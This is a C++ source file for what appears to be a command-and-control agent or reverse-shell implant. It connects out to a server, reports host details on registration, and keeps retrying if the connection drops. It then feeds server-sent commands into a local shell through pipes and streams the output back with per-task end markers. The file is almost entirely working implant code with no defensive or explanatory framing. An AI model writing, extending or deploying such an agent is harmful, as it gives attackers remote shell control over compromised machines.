#include "agent.hpp"
#include <print>
#include <stdexcept>

Agent::Agent(const std::string& ip, uint16_t port)
    : ip_(ip), port_(port), epollMgr_()
{
    try {
        pipfds_ = Pip::create();
        Raptor::Utils::setNonBlocking(pipfds_.err);
        Raptor::Utils::setNonBlocking(pipfds_.out);
        Raptor::Utils::setNonBlocking(pipfds_.in);

        epollMgr_.addEpoll(pipfds_.in,  EPOLLERR | EPOLLHUP);
        epollMgr_.addEpoll(pipfds_.out, Config::PIPE_READ_FLAGS);
        epollMgr_.addEpoll(pipfds_.err, Config::PIPE_READ_FLAGS);

        if (!connect()) {
            throw std::runtime_error("Failed to establish initial connection to server");
        }
    } catch (...) {
        epollMgr_.close();
        throw;
    }
}

Agent::~Agent()
{
    if (clientfd_ != -1) {
        ::close(clientfd_);
    }
    if (pipfds_.in != -1) {
        ::close(pipfds_.in);
    }
    if (pipfds_.out != -1) {
        ::close(pipfds_.out);
    }
    if (pipfds_.err != -1) {
        ::close(pipfds_.err);
    }
    epollMgr_.close();
}

void Agent::run()
{
    for (;;) {
        int n = ::epoll_wait(epollMgr_.getFd(), epollEvents_.data(), Config::MAX_EVENTS, -1);
        if (n < 0) {
            if (errno == EINTR) {
                continue;
            }
            throw std::runtime_error(std::format("epoll_wait: {}", strerror(errno)));
        }

        for (int i = 0; i < n; ++i) {
            const epoll_event& ev = epollEvents_[i];
            const int fd = ev.data.fd;

            if (ev.events & (EPOLLERR | EPOLLHUP | EPOLLRDHUP)) {
                handleEpollError(fd, ev.events);
                continue;
            }

            if (ev.events & EPOLLIN) {
                if (fd == clientfd_) {
                    readClient();
                } else if (fd == pipfds_.out || fd == pipfds_.err) {
                    readShell(fd);
                }
            }

            if (ev.events & EPOLLOUT) {
                if (fd == pipfds_.in) {
                    writeToShell();
                } else if (fd == clientfd_) {
                    writeClient();
                }
            }
        }
    }
}

void Agent::disconnectClient() noexcept
{
    if (clientfd_ != -1) {
        epollMgr_.delEpoll(clientfd_);
        ::close(clientfd_);
        clientfd_ = -1;
    }
}

bool Agent::connect()
{
    disconnectClient();
    reconnectAttempts_ = 0;

    while (reconnectAttempts_ < Config::MAX_RECONNECT_ATTEMPTS) {
        if ((clientfd_ = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
            logError("socket", errno);
            reconnectAttempts_++;
            std::this_thread::sleep_for(Config::CONNECTION_RETRY_INITIAL);
            continue;
        }

        sockaddr_in addr{};
        addr.sin_family = AF_INET;
        addr.sin_port   = htons(port_);
        if (inet_pton(AF_INET, ip_.c_str(), &addr.sin_addr) <= 0) {
            logError("inet_pton", errno);
            ::close(clientfd_);
            clientfd_ = -1;
            reconnectAttempts_++;
            std::this_thread::sleep_for(Config::CONNECTION_RETRY_INITIAL);
            continue;
        }

        Raptor::Utils::setNonBlocking(clientfd_);

        int rc = ::connect(clientfd_, reinterpret_cast<sockaddr*>(&addr), sizeof(addr));
        if (rc == -1 && errno != EINPROGRESS && errno != EWOULDBLOCK) {
            logError("connect", errno);
            ::close(clientfd_);
            clientfd_ = -1;
            reconnectAttempts_++;
            std::this_thread::sleep_for(Config::CONNECTION_RETRY_BACKOFF);
            continue;
        }

        if (!epollMgr_.addEpoll(clientfd_, Config::READ_FLAGS)) {
            logError("addEpoll(clientfd)", errno);
            ::close(clientfd_);
            clientfd_ = -1;
            reconnectAttempts_++;
            std::this_thread::sleep_for(Config::CONNECTION_RETRY_INITIAL);
            continue;
        }

        if (!registerAgent()) {
            logError("registerAgent failed", 0);
            disconnectClient();
            reconnectAttempts_++;
            std::this_thread::sleep_for(Config::CONNECTION_RETRY_BACKOFF);
            continue;
        }

        reconnectAttempts_ = 0;
        return true;
    }

    std::println(stderr, "ERROR: Max reconnection attempts ({}) exceeded",
                 Config::MAX_RECONNECT_ATTEMPTS);
    return false;
}

bool Agent::registerAgent()
{
    const auto reg = Raptor::Utils::collect();
    const auto payload = reg.serialize();

    Raptor::Common::Header hdr{};
    hdr.packetId = 1;
    hdr.type = Raptor::Common::PacketType::Register;
    hdr.direction = Raptor::Common::PacketDirection::Resp;
    hdr.flags = Raptor::Common::Flags::Success | Raptor::Common::Flags::Text;
    hdr.payloadSize = static_cast<uint32_t>(payload.size());

    const auto hdrBuf = hdr.serialize();
    std::vector<uint8_t> pkt;
    pkt.reserve(hdrBuf.size() + payload.size());
    pkt.insert(pkt.end(), hdrBuf.begin(), hdrBuf.end());
    pkt.insert(pkt.end(), payload.begin(), payload.end());

    size_t totalToWrite = pkt.size();
    size_t written = 0;

    while (written < totalToWrite) {
        ssize_t n = ::write(clientfd_, pkt.data() + written, totalToWrite - written);
        if (n < 0) {
            if (errno == EAGAIN || errno == EWOULDBLOCK) {
                logError("registerAgent: partial write", errno);
                return false;
            }
            logError("write(registerAgent)", errno);
            return false;
        }
        if (n == 0) {
            logError("write(registerAgent): wrote 0 bytes", 0);
            return false;
        }
        written += n;
    }

    return true;
}

void Agent::readClient() noexcept
{
    for (;;) {
        ssize_t n = ::read(clientfd_, readBuffer_.data(), readBuffer_.size());

        if (n == 0) {
            std::println("[readClient] Connection closed by peer");
            connect();
            return;
        }

        if (n < 0) {
            if (errno == EAGAIN || errno == EWOULDBLOCK) {
                epollMgr_.rearmRead(clientfd_);
                return;
            }
            if (errno == EINTR) {
                continue;
            }
            logError("read(clientfd)", errno);
            connect();
            return;
        }

        feed(readBuffer_.data(), static_cast<size_t>(n));
    }
}

void Agent::flushToClient(Entry& entry) noexcept
{
    Raptor::Common::Header hdr{};
    hdr.packetId = entry.taskId;
    hdr.type = Raptor::Common::PacketType::Command;
    hdr.direction = Raptor::Common::PacketDirection::Resp;
    hdr.flags = Raptor::Common::Flags::Success | Raptor::Common::Flags::Text;
    hdr.payloadSize = static_cast<uint32_t>(entry.outLen);
    hdr.serialize(entry.outBuf, Raptor::Common::Header::SIZE);
    epollMgr_.rearmWrite(clientfd_);
}

void Agent::writeClient() noexcept
{
    if (queue_.empty()) {
        return;
    }

    Entry& entry = queue_.front();

    if (entry.outLen == 0) {
        epollMgr_.rearmShellOutput(pipfds_.out, pipfds_.err);
        return;
    }

    if (completeClientWrite(entry)) {
        entry.outLen = 0;
        entry.outOffset = 0;

        if (entry.done) {
            queue_.pop_front();
            epollMgr_.rearmRead(clientfd_);
            if (!queue_.empty()) {
                epollMgr_.rearmPipeWrite(pipfds_.in);
            }
        } else {
            epollMgr_.rearmShellOutput(pipfds_.out, pipfds_.err);
        }
    }
}

bool Agent::completeClientWrite(Entry& entry) noexcept
{
    const size_t totalLen = Raptor::Common::Header::SIZE + entry.outLen;

    while (entry.outOffset < totalLen) {
        ssize_t n = ::write(clientfd_, entry.outBuf + entry.outOffset,
                           totalLen - entry.outOffset);

        if (n > 0) {
            entry.outOffset += static_cast<size_t>(n);
            continue;
        }

        if (n < 0) {
            if (errno == EINTR) {
                continue;
            }
            if (errno == EAGAIN || errno == EWOULDBLOCK) {
                epollMgr_.rearmWrite(clientfd_);
                return false;
            }
            logError("write(clientfd)", errno);
            connect();
            return false;
        }
        return false;
    }

    return true;
}

void Agent::writeToShell() noexcept
{
    if (queue_.empty()) {
        return;
    }

    Entry& entry = queue_.front();

    while (!entry.isStdinComplete()) {
        ssize_t n = ::write(pipfds_.in, entry.stdinBuf + entry.stdinOffset,
                           entry.getStdinRemaining());

        if (n > 0) {
            entry.stdinOffset += static_cast<size_t>(n);
            continue;
        }

        if (n < 0) {
            if (errno == EINTR) {
                continue;
            }
            if (errno == EAGAIN || errno == EWOULDBLOCK) {
                epollMgr_.rearmPipeWrite(pipfds_.in);
                return;
            }
            std::string errMsg = std::string("write(pipe): ") + strerror(errno);
            sendErrorResponse(entry.taskId, errMsg.c_str());
            return;
        }
    }

    epollMgr_.rearm(pipfds_.in, EPOLLERR | EPOLLHUP);
    epollMgr_.rearmShellOutput(pipfds_.out, pipfds_.err);
}

void Agent::readShell(int fd) noexcept
{
    if (queue_.empty()) {
        return;
    }

    Entry& entry = queue_.front();

    for (;;) {
        size_t capacity = entry.getOutCapacity();

        if (capacity == 0) {
            flushToClient(entry);
            return;
        }

        ssize_t n = ::read(fd, entry.outBuf + Raptor::Common::Header::SIZE + entry.outLen,
                          capacity);

        if (n < 0) {
            if (errno == EINTR) {
                continue;
            }
            if (errno == EAGAIN || errno == EWOULDBLOCK) {
                if (entry.outLen >= Config::FLUSH_THRESHOLD) {
                    std::println("flush: {}",entry.outLen);
                    flushToClient(entry);
                    return;
                }
                epollMgr_.rearmPipeRead(fd);
                return;
            }
            std::string errMsg = std::string("read(shell pipe): ") + strerror(errno);
            sendErrorResponse(entry.taskId, errMsg.c_str());
            return;
        }

        if (n == 0) {
            std::println("[readShell] EOF from shell");
            return;
        }

        const uint8_t* newData = entry.outBuf + Raptor::Common::Header::SIZE + entry.outLen;
        const size_t newBytes = static_cast<size_t>(n);
        const char* nul = static_cast<const char*>(memchr(newData, '\0', newBytes));

        const bool hasMarker = nul
            && (size_t)(nul - (char*)newData) + 5 < newBytes
            && memcmp(nul + 1, "END:", 4) == 0;

        entry.outLen += newBytes;

        if (hasMarker) {
            entry.done = true;
            flushToClient(entry);
            return;
        }

        if (entry.outLen >= Config::FLUSH_THRESHOLD) {

            std::println("flush: {}",entry.outLen);
            flushToClient(entry);
            return;
        }
    }
}

void Agent::onCommand(const Raptor::Common::Header& hdr, std::string_view cmd) noexcept
{
    std::println("[onCommand] taskId={}, size={}", hdr.packetId, cmd.size());

    const std::string marker = Raptor::Utils::makeEndMarker(hdr.packetId);
    const size_t total = cmd.size() + marker.size();

    if (total >= Config::RECV_BUF_SIZE) {
        std::println(stderr, "ERROR: Command + marker too large: {} >= {}",
                    total, Config::RECV_BUF_SIZE);
        return;
    }

    Entry e;
    e.taskId = hdr.packetId;
    std::memcpy(e.stdinBuf, cmd.data(), cmd.size());
    std::memcpy(e.stdinBuf + cmd.size(), marker.data(), marker.size());
    e.stdinLen = total;

    queue_.push_back(std::move(e));
    epollMgr_.rearmPipeWrite(pipfds_.in);
}

void Agent::onUpload(const Raptor::Common::Header& hdr, std::string_view data) noexcept
{
    std::println(stderr, "WARNING: onUpload not yet implemented");
}

void Agent::onDownload(const Raptor::Common::Header& hdr, std::string_view path) noexcept
{
    std::println(stderr, "WARNING: onDownload not yet implemented");
}

void Agent::logError(const char* context, int errnum) noexcept
{
    if (errnum != 0) {
        std::println(stderr, "[ERROR] {}: {}", context, strerror(errnum));
    } else {
        std::println(stderr, "[ERROR] {}", context);
    }
}

void Agent::handleEpollError(int fd, uint32_t events) noexcept
{
    if (fd == clientfd_) {
        std::println("[handleEpollError] Server connection lost (events=0x{:x})", events);
        connect();
    } else {
        std::println("[handleEpollError] Pipe error for fd={} (events=0x{:x})", fd, events);
        epollMgr_.delEpoll(fd);
    }
}

void Agent::sendErrorResponse(uint32_t taskId, const char* errorMsg) noexcept
{
    if (clientfd_ == -1) {
        std::println(stderr, "[sendErrorResponse] Not connected, cannot send error: {}", errorMsg);
        return;
    }

    if (queue_.empty()) {
        std::println(stderr, "[sendErrorResponse] No active task, cannot send error: {}", errorMsg);
        return;
    }

    Entry& entry = queue_.front();

    std::string msg = std::string("[ERROR] ") + errorMsg;
    size_t msgLen = msg.size();

    if (msgLen >= (sizeof(entry.outBuf) - Raptor::Common::Header::SIZE)) {
        msgLen = (sizeof(entry.outBuf) - Raptor::Common::Header::SIZE) - 1;
    }

    std::memcpy(entry.outBuf + Raptor::Common::Header::SIZE, msg.data(), msgLen);
    entry.outLen = msgLen;
    entry.done = true;

    Raptor::Common::Header hdr{};
    hdr.packetId = entry.taskId;
    hdr.type = Raptor::Common::PacketType::Command;
    hdr.direction = Raptor::Common::PacketDirection::Resp;
    hdr.flags = Raptor::Common::Flags::Success | Raptor::Common::Flags::Text;
    hdr.payloadSize = static_cast<uint32_t>(entry.outLen);
    hdr.serialize(entry.outBuf, Raptor::Common::Header::SIZE);

    std::println("[sendErrorResponse] taskId={}, message: {}", taskId, errorMsg);
    epollMgr_.rearmWrite(clientfd_);
}

int main()
{
    try {
        Agent agent("127.0.0.1", 8080);
        agent.run();
    } catch (const std::exception& e) {
        std::println(stderr, "Fatal: {}", e.what());
        return 1;
    }
}
